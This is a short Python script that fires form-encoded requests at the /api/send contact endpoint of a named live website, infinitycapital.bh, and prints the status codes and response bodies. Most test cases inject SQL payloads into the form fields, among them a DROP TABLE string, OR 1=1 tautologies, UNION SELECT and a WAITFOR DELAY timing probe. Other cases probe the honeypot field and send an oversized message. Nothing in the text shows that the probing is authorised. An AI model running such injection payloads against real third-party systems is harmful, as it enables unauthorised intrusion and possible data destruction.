import subprocess,os,json,time
W=os.environ['WORK_PATH']
def req(path, data=None, ctype='form', method='POST', hdrs=None, extra=None):
    cmd=['bash',W+'/rq.sh','-X',method,'-w','\n%{http_code}|%{time_total}']
    if hdrs:
        for h in hdrs: cmd+=['-H',h]
    if extra: cmd+=extra
    if data is not None:
        if ctype=='form': cmd+=['-F',data]
        else: cmd+=['-H','Content-Type: '+ctype,'--data-binary',data]
    cmd.append('https://www.infinitycapital.bh'+path)
    r=subprocess.run(cmd,capture_output=True,text=True)
    return r.stdout

F={'fname':'Test','lname':'User','areacode':'973','tel':'1234567','cname':'QA',
   'subject':'Hello','msg':'Hello there','check':'','targets':'General Enquiry'}
def form(**kw):
    d=dict(F); d.update(kw)
    return '&'.join(f"{k}={str(v).replace(' ','%20').replace(chr(39),'%27')}" for k,v in d.items() if v is not None)

tests=[
 ("baseline", form()),
 ("no fields", ''),
 ("only msg", form(fname=None,lname=None,areacode=None,tel=None,cname=None,subject=None,targets=None,check=None)),
 ("valid all", form(check='')),
 ("check=1 (honeypot)", form(check='1')),
 ("bad targets", form(targets="'; DROP TABLE--")),
 ("numeric areacode sqli", form(areacode="973 OR 1=1")),
 ("tel sqli", form(tel="1' OR '1'='1")),
 ("msg sqli", form(msg="x' UNION SELECT NULL--")),
 ("subject sqli", form(subject="x'; WAITFOR DELAY '0:0:5'--")),
 ("cname sqli", form(cname="x' OR 1=1--")),
 ("fname sqli", form(fname="x' OR 1=1--")),
 ("lname sqli", form(lname="x' OR 1=1--")),
 ("targets array", form(targets="['a','b']")),
 ("msg huge", form(msg="A"*5000)),
]
for name,d in tests:
    out=req('/api/send',data=d)
    code=out.strip().split('\n')[-1]
    body=out[:out.rfind('\n')]
    print(f"{name:28s} {code:20s} body={body[:120]!r}")
